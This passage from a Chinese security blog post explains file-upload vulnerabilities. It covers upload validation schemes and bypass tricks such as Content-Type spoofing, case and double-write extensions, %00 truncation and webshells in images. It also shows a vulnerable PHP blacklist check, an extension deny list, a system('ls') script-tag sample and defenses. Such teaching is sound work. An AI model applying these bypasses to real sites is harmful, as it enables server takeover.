@@ -1,0 +1,2164 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="浅析文件操作漏洞, hybcx&#39;s blog">
+    <meta name="description" content="">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>浅析文件操作漏洞 | hybcx&#39;s blog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 6.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">hybcx&#39;s blog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">hybcx&#39;s blog</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/16.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">浅析文件操作漏洞</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E5%B8%B8%E8%A7%81top%E6%BC%8F%E6%B4%9E/" class="post-category">
+                                常见top漏洞
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2023-08-07
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="0x01-文件上传">0x01 文件上传</h2>
+<p>先了解一下基础知识</p>
+<p>要深入了解文件上传，必须了解上传属性、常见文件的结构、图形处理函数等内容。</p>
+<p><strong>1）</strong> <strong>报文特点：</strong></p>
+<p>观察文件上传报文的特点：</p>
+<p><strong>Header中Content-Type特征有二：</strong></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1.multipart/form-data（form表单的enctype属性，规定为二进制数据）<br><br>2.boundary字符串（作用为分隔符，以区分POST数据）<br></code></pre></td></tr></tbody></table></figure>
+<p><strong>POST内容特征有五：</strong></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1.Content-Disposition：form-data<br><br>2. name：input表单名<br><br>3.filename：文件名<br><br>4.Content-Type：定义文件的类型和网页的编码，决定浏览器将以什么形式、什么编码读取这个文件；<br><br>5.boundary：Content-Type的值前面加了两个---<br></code></pre></td></tr></tbody></table></figure>
+<p><img src="image-20230617150730383.png" alt="image-20230617150730383"></p>
+<p><strong>2）</strong> <strong>常见校验规则</strong></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"> 现存常用的上传校验规则无非下面几类：<br><br>1.客户端javascript校验（后缀名）<br><br>2.文件头content-type字段校验（image/gif）：附带参数<br><br>4.后缀名黑/白名单校验：扩展名<br><br>5.文件内容头校验：GIF89a<br><br>6.文件内容校验：文件信息，二次渲染<br><br>7.自定义正则校验<br></code></pre></td></tr></tbody></table></figure>
+<p><strong>3）一个澄清</strong></p>
+<p>​		文件上传和文件解析是两个过程，即使我们上传的是php文件，但解析为图片，访问php文件会显示“图片无法显示”；或者我们上传的是jpg文件，但里面混有shell脚本，若被解析为php文件也会执行；又或者上传处没法绕过检测，只能上传jpg文件，但在其他功能处存在文件包含等功能，仍可执行成功。</p>
+<p>还是回到安全的本质，上传是“输入”，那文件解析就是“输出”，任何漏洞挖掘都需要结合输入+输出。</p>
+<p><img src="image-20230617150805912.png" alt="image-20230617150805912"></p>
+<p><strong>4)  挖掘思路</strong></p>
+<p>上传漏洞挖掘思路总结起来分三步：</p>
+<p>1、首先尝试直接上传脚本文件进行RCE；</p>
+<p>2、若存在过滤，对于检测机制进行猜测，确定机制后尝试绕过；</p>
+<p>3、若无法绕过上传，插入脚本后寻找解析/文件包含漏洞；</p>
+<p>4、换其他类型文件：html、js、svg等转到挖掘其他漏洞。</p>
+<h3 id="一、文件上传常见场景">一、文件上传常见场景</h3>
+<p><img src="image-20230616110259554.png" alt="image-20230616110259554"></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">场景：<br>1.客户端JavaScript检测<br><br>如果上传非法文件，返回结果很快，或者F12打开开发者模式，上传非法文件，发现没有网络请求，但是被拦截了，很有可能就是客户端进行了JS校验检测。这种前端采用JS限制上传类型和大小的方式<br><br>绕过思路：1.直接本地禁用JS，不让其做检测  2.抓包，修改文件后缀名类型，绕过检测限制<br><br>2.服务器后端检测<br>服务器后端检测有较多方式，普遍分为文件类型检测，文件头类型，文件扩展名名单检测，文件内容检测，接下来进行简要分析。<br><br>    a.文件类型检测<br>    此类检测防护主要是从content-type进行检测，检验请求中content-type是否符合可接受的上传类型					  	(如"image/gif","image/png","image/jpeg")<br>    <br>绕过思路：抓包将content-type改为可接受图片形式，即可绕过<br><br>	b.文件头类型检测<br>	上个文件类型是检测content-type,比较好伪造，这个则是使用getimagesize()函数来获取文件的MIME类型，通过文件头进行判断文件类型<br>	<br>绕过思路：针对这种，上传木马恶意文件时，先使用编辑工具在数据最前面添加图片的文件头进行伪造，即可绕过<br><br>    c.文件扩展名检测<br>    这种类型有基于黑名单检测和白名单检测。通常基于黑名单是很不安全的，黑名单机制：只拦截名单中出现的扩展后缀名，其余默认放行。这就取决于名单中的扩展后缀名覆盖能力范围了，很难把所有的考虑全面，就很容易造成漏洞。<br><br>黑名单绕过思路：可以从服务器的解析特性进行分析，如特殊可解析后缀php3,php7,phtml,jspx等 如特殊的解析方式陌生后缀名，带换行后缀名，双后缀名等解析差异造成的漏洞。 还可以从混淆方面出发，后缀名大小写，点绕过，空格绕过，以及上传.htaccess配置控制文件权限和::$DATA数据流的使用<br><br>基于白名单相对于黑名单就安全很多了，要求只能是特定扩展名的文件才能够上传。<br>白名单绕过思路：MIME绕过，修改文件类型为白名单可接受的类型，以及%00，0x00截断绕过，这种场景针对save_path可控。<br><br>注：00截断原理其实很巧妙，利用场景是文件保存路径可控，这样一来我们上传的文件符合白名单就行，真正动手的地方在文件保存路径出，可以放上自己的webshell文件，然后在webshell文件后面添加%00,或0x00，再加一些字符，这样一来，系统在解析碰到00就会截断，后面字符就不起作用，只剩下前面的webshell文件名，就可以在url中进行访问了。%00和0x00的使用区别在于提交get请求时，是%00,会进行url自动解码动作，然后进入验证函数。0x00则是post请求直接进入验证函数。<br><br>    d.文件内容检测<br>    比较厉害的防护检测，就是针对内容做检测，这种防护能力比较强，但也不是不能绕过。自始至终，攻防都是在对抗中螺旋演进的。<br>    这种检测防护基本都是从webshell具有的代表性敏感字符?或者危险敏感函数。<br><br>绕过思路：从特殊敏感字符开始进行Fuzz测试，探测webshell中有多少必要的字符存在被替换，如果构成webshell执行的字符被替换得较多，剩下未过滤的字符的难以支撑webshell执行，可以换个角度利用系统，调用脚本语言，如&lt;script language='php'&gt;system('ls');&lt;script&gt;。<br>	e.对图片进行二次渲染<br>	<br>绕过思路：借鉴二进制中钩子的思想，其实就是想在上传图片中找一块"地方"，存储webshell，这块"地方"要求在后端处理后没有被过滤掉。那就上传一个正常的文件，然后下载下来，diff一下，查看哪些位置没有被改动过，然后添加webshell进行尝试。<br></code></pre></td></tr></tbody></table></figure>
+<h3 id="二、文件上传漏洞的原理">二、文件上传漏洞的原理</h3>
+<pre><code>    文件上传漏洞是指用户上传了一个可执行的脚本文件（php、jsp、xml、cer等文件），而WEB系统没有进行检测或逻辑做的不够安全。
+    
+    文件上传功能本身没有问题，问题在于上传后如何处理及解释文件。
+    
+    一般情况下，Web应用都会允许用户上传一些文件，如头像、附件等信息，如果Web应用没有对用户上传的文件进行有效的检查过滤，那么恶意用户就会上传一句话木马等Webshell，从而达到控制Web网站的目的。
+    
+    存在文件上传功能的地方都有可能存在文件上传漏洞，比如相册、头像上传，视频、照片分享。论坛发帖和邮箱等可以上传附件的地方也是上传漏阔的高危地带，另外像文件管理器这样的功能也有可能被攻击者所利用。
+    
+    这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等
+</code></pre>
+<h3 id="三、利用方式">三、利用方式</h3>
+<p>1.上传WebShell文件，攻击者可通过这些网页后门执行命令并控制服务器。<br>
+2.上传文件是钓鱼图片或者包含了脚本的图片时，图片中的脚本，在某些版本的浏览器上会被作为脚本执行，从而被利用于钓鱼或者欺诈<br>
+3.上传病毒、木马文件，用于诱骗用户和管理员下载执行或者直接自动运行。<br>
+4.上传文件是其他恶意脚本时，攻击者可直接执行脚本进行攻击。</p>
+<pre><code>常用防御方式:
+
+1.检查文件上传路径 ( 避免 0x00 截断、 IIS6.0 文件夹解析漏洞、目录遍历 )
+2.文件扩展名检测 ( 避免服务器以非图片的文件格式解析文件 ),验证文件扩展名 通常有两种方式 : 黑名单和白名单 .
+3.文件 MIME验证 ( 比如 GIF 图片 MIME为 image/gif,CSS 文件的 MIME为 text/css 等 )
+4.图片二次渲染 ( 最变态的上传漏洞防御方式 , 基本上完全避免了文件上传漏洞 )
+5.文件重命名 ( 如随机字符串或时间戳等方式 , 防止攻击者得到 webshell 的路径 )
+6.隐藏上传路径
+7.文件内容检测 ( 避免图片中插入 webshell)
+</code></pre>
+<h3 id="四、绕过方式">四、绕过方式</h3>
+<p><img src="image-20230616192713459.png" alt="image-20230616192713459"></p>
+<h4 id="1-前端检测">1.前端检测</h4>
+<blockquote>
+<p>主要是通过JavaScript代码进行检测，是最简单的绕过</p>
+</blockquote>
+<p><em><strong>绕过方法：</strong></em></p>
+<ul>
+<li>删除或者禁用js：火狐–&gt;点击JS使其为灰色-&gt;成功禁用</li>
+<li>使用代理上传文件，brup suite；上传符合要求的文件类型，抓包修改文件类型</li>
+</ul>
+<h4 id="2-后端-扩展名检测">2.后端_扩展名检测</h4>
+<blockquote>
+<p>针对文件的扩展名后缀进行检测，主要通过黑白名单进行过滤检测，若不符合过滤规则则不允许上传。</p>
+</blockquote>
+<h5 id="2-1黑名单">2.1黑名单</h5>
+<blockquote>
+<p>黑名单检测：一般有个专门的<strong>blacklist</strong>文件或列举出黑名单，里面会包含常见的危险脚本文件。</p>
+<p><img src="image-20230517000415341.png" alt="image-20230517000415341"></p>
+</blockquote>
+<p><em><strong>绕过方法</strong></em></p>
+<ol>
+<li><strong>大小写绕过：</strong> 服务端没有将后缀名转换为统一格式进行比对，导致可以上传后缀为pHp的文件，又因为Windows操作系统大小写不敏感，所以.pHp扔回被当成php文件解析。</li>
+</ol>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'submit'</span>])) {<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) {<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">".php"</span>,<span class="hljs-string">".php5"</span>,<span class="hljs-string">".php4"</span>,<span class="hljs-string">".php3"</span>,<span class="hljs-string">".php2"</span>,<span class="hljs-string">".html"</span>,<span class="hljs-string">".htm"</span>,<span class="hljs-string">".phtml"</span>,<span class="hljs-string">".pht"</span>,<span class="hljs-string">".pHp"</span>,<span class="hljs-string">".pHp5"</span>,<span class="hljs-string">".pHp4"</span>,<span class="hljs-string">".pHp3"</span>,<span class="hljs-string">".pHp2"</span>,<span class="hljs-string">".Html"</span>,<span class="hljs-string">".Htm"</span>,<span class="hljs-string">".pHtml"</span>,<span class="hljs-string">".jsp"</span>,<span class="hljs-string">".jspa"</span>,<span class="hljs-string">".jspx"</span>,<span class="hljs-string">".jsw"</span>,<span class="hljs-string">".jsv"</span>,<span class="hljs-string">".jspf"</span>,<span class="hljs-string">".jtml"</span>,<span class="hljs-string">".jSp"</span>,<span class="hljs-string">".jSpx"</span>,<span class="hljs-string">".jSpa"</span>,<span class="hljs-string">".jSw"</span>,<span class="hljs-string">".jSv"</span>,<span class="hljs-string">".jSpf"</span>,<span class="hljs-string">".jHtml"</span>,<span class="hljs-string">".asp"</span>,<span class="hljs-string">".aspx"</span>,<span class="hljs-string">".asa"</span>,<span class="hljs-string">".asax"</span>,<span class="hljs-string">".ascx"</span>,<span class="hljs-string">".ashx"</span>,<span class="hljs-string">".asmx"</span>,<span class="hljs-string">".cer"</span>,<span class="hljs-string">".aSp"</span>,<span class="hljs-string">".aSpx"</span>,<span class="hljs-string">".aSa"</span>,<span class="hljs-string">".aSax"</span>,<span class="hljs-string">".aScx"</span>,<span class="hljs-string">".aShx"</span>,<span class="hljs-string">".aSmx"</span>,<span class="hljs-string">".cEr"</span>,<span class="hljs-string">".sWf"</span>,<span class="hljs-string">".swf"</span>,<span class="hljs-string">".htaccess"</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>]);<span class="hljs-comment">//去除字符串收尾的空白字符</span><br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点(这是自定义的函数)</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">'.'</span>);<span class="hljs-comment">//查找'.'在字符串中最后一次出现的位置</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">'::$DATA'</span>, <span class="hljs-string">''</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span><br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) { <span class="hljs-comment">//检查第一个参数中的内容是否在第二个参数(即数组中)</span><br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">'/'</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">"YmdHis"</span>).<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) {<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            } <span class="hljs-keyword">else</span> {<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">'上传出错！'</span>;<br>            }<br>        } <span class="hljs-keyword">else</span> {<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">'此文件类型不允许上传！'</span>;<br>        }<br>    } <span class="hljs-keyword">else</span> {<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">'文件夹不存在,请手工创建！'</span>;<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure>
+<ul>
+<li>通过源代码可见，黑名单里虽然看似过滤得很全面，但还是出现了纰漏–没有将后缀名转为小写，若后缀名为<code>.pHP</code>，则可以进行大小写绕过，成功上传文件。</li>
+</ul>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span><br></code></pre></td></tr></tbody></table></figure>
+<ol start="2">
+<li><strong>修改后缀名绕过：</strong></li>
+</ol>
+<ul>
+<li>名单中不允许上传<code>.asp，.php，.jsp，.exe</code>后缀的文件</li>
+<li>但可上传<br>
+—<code>asa</code> <code>cer</code> <code>aspx</code><br>
+—<code>php</code> <code>php3</code> <code>php4</code> <code>php5</code> <code>phtml</code> <code>pht</code><br>
+—<code>jspx</code> <code>jspf</code><br>
+—<code>exee</code></li>
+<li>前提是apache的httpd.conf中有如下配置代码</li>
+</ul>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1 | AddType application/x-httpd-php .php .phtml .phps .php5 .pht<br></code></pre></td></tr></tbody></table></figure>
+<p>当我们修改文件名后，可以发现文件上传成功</p>
+<ol start="3">
+<li><strong>重写（双写）绕过</strong></li>
+</ol>
+<ul>
+<li>服务端将<code>黑名单的后缀名替换为空，但只进行一次</code>。上传.pphphp后缀，替换一个php为空，则后缀名变为.php，成功绕过。</li>
+</ul>
